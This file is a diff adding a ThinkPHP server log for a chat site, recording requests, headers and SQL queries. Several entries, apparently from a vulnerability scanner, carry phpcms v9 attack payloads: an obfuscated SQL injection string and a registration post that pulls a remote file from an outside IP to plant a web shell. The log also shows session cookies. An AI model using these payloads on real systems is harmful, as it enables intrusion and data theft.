@@ -1,0 +1,4603 @@
+---------------------------------------------------------------
+[ 2017-07-30T01:53:19+08:00 ] 0.0.0.0 140.205.201.47 GET /index.php?m=wap&a=index&siteid=1
+[ info ] eddchat.oumaikeji.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.261934s][吞吐率：3.82req/s] [内存消耗：2,493.88kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'host' => 'eddchat.oumaikeji.com:80',
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T01:53:20+08:00 ] 0.0.0.0 140.205.201.47 GET /index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6
+[ info ] eddchat.oumaikeji.com:80/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6 [运行时间：0.042225s][吞吐率：23.68req/s] [内存消耗：2,494.83kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'host' => 'eddchat.oumaikeji.com:80',
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'attachment',
+  'c' => 'attachments',
+  'a' => 'swfupload_json',
+  'aid' => '1',
+  'src' => '&id=%*27a*nd ex*p(~(sele*ct%*2afro*m(sele*ct co*nc*at(0x7e,md5(233333),0x7e))x))#&m=1&f=test&modelid=2&catid=6',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T01:53:20+08:00 ] 0.0.0.0 140.205.201.47 GET /index.php?m=content&c=down&a_k=
+[ info ] eddchat.oumaikeji.com:80/index.php?m=content&c=down&a_k= [运行时间：0.056078s][吞吐率：17.83req/s] [内存消耗：2,493.77kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'host' => 'eddchat.oumaikeji.com:80',
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'content',
+  'c' => 'down',
+  'a_k' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T02:06:23+08:00 ] 0.0.0.0 203.208.60.213 GET /robots.txt
+[ info ] eddchat.oumaikeji.com/robots.txt [运行时间：0.077868s][吞吐率：12.84req/s] [内存消耗：1,853.24kb] [文件加载：41]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'robots.txt',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/robots.txt',
+  'user-agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-encoding' => 'gzip,deflate,br',
+  'accept' => 'text/plain,text/html,*/*',
+  'connection' => 'Keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T02:06:24+08:00 ] 0.0.0.0 203.208.60.213 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.041262s][吞吐率：24.24req/s] [内存消耗：2,493.73kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'host' => 'eddchat.oumaikeji.com',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept-encoding' => 'gzip,deflate,br',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'Keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T03:12:49+08:00 ] 0.0.0.0 140.205.201.30 POST /index.php?m=member&c=index&a=register&siteid=1
+[ info ] eddchat.oumaikeji.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.474576s][吞吐率：2.11req/s] [内存消耗：2,496.03kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded',
+  'content-length' => '171',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+  'host' => 'eddchat.oumaikeji.com:80',
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'PDuOWflV',
+  'password' => 'PDuOWflV',
+  'email' => 'PDuOWflV@aliyun.com',
+  'info' => 
+  array (
+    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T03:15:09+08:00 ] 0.0.0.0 140.205.201.30 GET /index.php?m=wap&a=index&siteid=1
+[ info ] eddchat.oumaikeji.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.045385s][吞吐率：22.03req/s] [内存消耗：2,493.91kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'host' => 'eddchat.oumaikeji.com:80',
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T03:15:09+08:00 ] 0.0.0.0 140.205.201.30 GET /index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6
+[ info ] eddchat.oumaikeji.com:80/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6 [运行时间：0.040264s][吞吐率：24.84req/s] [内存消耗：2,494.83kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'host' => 'eddchat.oumaikeji.com:80',
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'attachment',
+  'c' => 'attachments',
+  'a' => 'swfupload_json',
+  'aid' => '1',
+  'src' => '&id=%*27a*nd ex*p(~(sele*ct%*2afro*m(sele*ct co*nc*at(0x7e,md5(233333),0x7e))x))#&m=1&f=test&modelid=2&catid=6',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T03:15:09+08:00 ] 0.0.0.0 140.205.201.30 GET /index.php?m=content&c=down&a_k=
+[ info ] eddchat.oumaikeji.com:80/index.php?m=content&c=down&a_k= [运行时间：0.042693s][吞吐率：23.42req/s] [内存消耗：2,493.77kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'host' => 'eddchat.oumaikeji.com:80',
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'content',
+  'c' => 'down',
+  'a_k' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T08:11:16+08:00 ] 0.0.0.0 140.205.225.186 POST /index.php?m=member&c=index&a=register&siteid=1
+[ info ] eddchat.oumaikeji.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.424562s][吞吐率：2.36req/s] [内存消耗：2,496.03kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded',
+  'content-length' => '171',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+  'host' => 'eddchat.oumaikeji.com:80',
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'LwXnferA',
+  'password' => 'LwXnferA',
+  'email' => 'LwXnferA@aliyun.com',
+  'info' => 
+  array (
+    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T08:11:26+08:00 ] 0.0.0.0 140.205.225.186 GET /index.php?m=wap&a=index&siteid=1
+[ info ] eddchat.oumaikeji.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.052008s][吞吐率：19.23req/s] [内存消耗：2,493.91kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'host' => 'eddchat.oumaikeji.com:80',
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T08:11:26+08:00 ] 0.0.0.0 140.205.225.186 GET /index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6
+[ info ] eddchat.oumaikeji.com:80/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6 [运行时间：0.039028s][吞吐率：25.62req/s] [内存消耗：2,494.83kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'host' => 'eddchat.oumaikeji.com:80',
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'attachment',
+  'c' => 'attachments',
+  'a' => 'swfupload_json',
+  'aid' => '1',
+  'src' => '&id=%*27a*nd ex*p(~(sele*ct%*2afro*m(sele*ct co*nc*at(0x7e,md5(233333),0x7e))x))#&m=1&f=test&modelid=2&catid=6',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T08:11:26+08:00 ] 0.0.0.0 140.205.225.186 GET /index.php?m=content&c=down&a_k=
+[ info ] eddchat.oumaikeji.com:80/index.php?m=content&c=down&a_k= [运行时间：0.050252s][吞吐率：19.90req/s] [内存消耗：2,493.77kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+  'host' => 'eddchat.oumaikeji.com:80',
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'content',
+  'c' => 'down',
+  'a_k' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T08:34:23+08:00 ] 0.0.0.0 110.188.255.184 GET /home/chat/home_page.html
+[ info ] eddchat.oumaikeji.com/home/chat/home_page.html [运行时间：0.429728s][吞吐率：2.33req/s] [内存消耗：3,553.14kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'home_page',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/home_page.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'UID=19vLz; CUID=doEZK',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\chat\home_page.html [ array (
+  0 => 'client_id',
+  1 => 'client_img',
+  2 => 'client_name',
+  3 => 'clients',
+  4 => 'today_mess',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.002159s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.019237s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000779s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000584s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` [ RunTime:0.000674s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000557s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_mess` [ RunTime:0.006022s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_mess` WHERE  ( `mess_date` > '1501344000' and `mess_date` < '1501430400' ) ORDER BY mess_date asc [ RunTime:0.000644s ]
+---------------------------------------------------------------
+[ 2017-07-30T08:34:24+08:00 ] 0.0.0.0 110.188.255.184 GET /home/chat/favicon.png
+[ info ] eddchat.oumaikeji.com/home/chat/favicon.png [运行时间：0.081398s][吞吐率：12.29req/s] [内存消耗：3,454.02kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'favicon.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/favicon.png',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'UID=19vLz; PHPSESSID=21mjc3995388v4d4l6n4ocmqd0; CUID=nxVVd',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003474s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006245s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000712s ]
+---------------------------------------------------------------
+[ 2017-07-30T08:34:24+08:00 ] 0.0.0.0 110.188.255.184 POST /home/chat/bind.html
+[ info ] eddchat.oumaikeji.com/home/chat/bind.html [运行时间：0.088065s][吞吐率：11.36req/s] [内存消耗：3,425.61kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'bind',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '48',
+  'x-original-url' => '/home/chat/bind.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'UID=19vLz; PHPSESSID=21mjc3995388v4d4l6n4ocmqd0; CUID=9gDIW',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'client_id' => '7f0000010fa000000008',
+  'client_name' => 'admin',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->bind[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006467s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006128s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000698s ]
+[ sql ] [ SQL ] SELECT `avatar`,`user_login` FROM `edd_users` WHERE  `user_login` = 'admin' [ RunTime:0.000550s ]
+---------------------------------------------------------------
+[ 2017-07-30T13:11:47+08:00 ] 0.0.0.0 14.215.176.19 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.495277s][吞吐率：2.02req/s] [内存消耗：2,494.35kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0',
+  'referer' => 'http://www.baidu.com/s?wd=www',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'en-US,*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
